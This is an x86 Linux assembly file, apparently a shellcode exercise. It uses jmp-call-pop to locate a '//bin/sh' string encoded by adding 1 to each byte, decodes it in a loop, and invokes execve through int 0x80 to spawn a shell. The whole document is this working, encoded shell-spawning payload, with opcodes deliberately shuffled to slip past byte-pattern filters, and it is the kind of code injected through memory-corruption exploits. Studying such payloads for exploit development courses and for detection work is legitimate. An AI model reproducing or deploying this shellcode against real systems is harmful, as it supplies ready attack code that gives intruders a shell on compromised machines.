global _start

section .text
_start:
    jmp short here

me:
    mov dword esi, [esp]    ; equivalent to mov the @ of our encoded //bin/sh into esi
    pop edi                 ; same @ in edi
    
    push 0x1                ; mix a little bit the opcodes
    pop eax
    dec eax
    push eax
    mov edx,esp

    xor ecx, ecx
    mov cl, 0x7             ; //bin/sh is 7 bytes long

dec1:                       
    mov eax, [edi + ecx]    ; we are looping on our string
    dec eax                 ; decrement the value
    mov [edi + ecx], eax    ; setting the right char into memory
    dec cl
    jns dec1                ; jump if not signed

    xor eax, eax            ; here we go for setting the right argument for our execve syscall
    push eax
    add esp,3
    lea esi,[esi+6]
    xor eax,[esi-2]

    push eax
    xor eax,eax
    xor eax,[edi]
    push eax
    mov ebx,esp 

    xor eax,eax
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb              ; int execve(const char *filename, char *const argv[],char *const envp[]);

    int 0x80

here:
    call me
    path db 0x30,0x30,0x63,0x6a,0x6f,0x30,0x74,0x69 ; encoded //bin/sh string, we added 1 to each byte